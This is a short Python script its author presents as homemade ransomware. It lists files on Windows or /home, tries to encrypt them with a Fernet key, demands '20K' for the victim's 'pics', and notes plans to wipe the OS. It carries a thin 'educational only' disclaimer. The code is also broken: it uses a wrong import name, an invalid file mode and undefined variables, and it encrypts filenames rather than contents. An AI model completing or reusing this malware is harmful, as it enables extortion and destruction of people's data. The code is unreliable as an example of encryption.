"""
   Simple ransomware made without any tutorial. Made only with pure suffering and tears.
   Ransomeware vr.1 
   date: Feb 11, 2023
   Creator: Mr. Waltz
   Disclaimer: Not to be used for malicious purposes, only educational ones. Also, this will only run on windows devices. because it uses the windows
   path (c://), Also any anti virus will just absolutely hammer this thing """

#Variable Assignment. My favorite part.
files_list = []
safekey = input("Enter launch code: ? ") #Lmao

if safekey != '9/11':
    quit()

#Time for some file searching!
import os


path = "C://"
path2 = '/home'
try:
    files_list = os.listdir(path)
    print(files_list)
    files_list.remove('ransomware.py')
except:
    weak_crack = os.listdir(path2)
    files_list.remove('ransomware.py')
    print(weak_crack)

# Now we got all da goods, TIME TO RUIN THEIR DAY. (Educationally that is)
from cryptography.fernet import fernet

unlock = open('FetnetPubkey.txt', 'rw')

unlock.write(fernet.generate_key())

print(unlock)

for f in files_list:
    fernet(unlock).encrypt(f)
    
for n in weak_crack:
    fernet(unlock).encrypt(n)
    
password = unlock
Malek = input("GIVE ME 20K IF YOU WANT YOUR PICS BACK. Jk?")
if Malek == password:
    print("Good job.")
else:
    print("Say bye bye....")
    
print("Executing system shutdown.")
#Add func to fry system later, perhaps delete OS. 

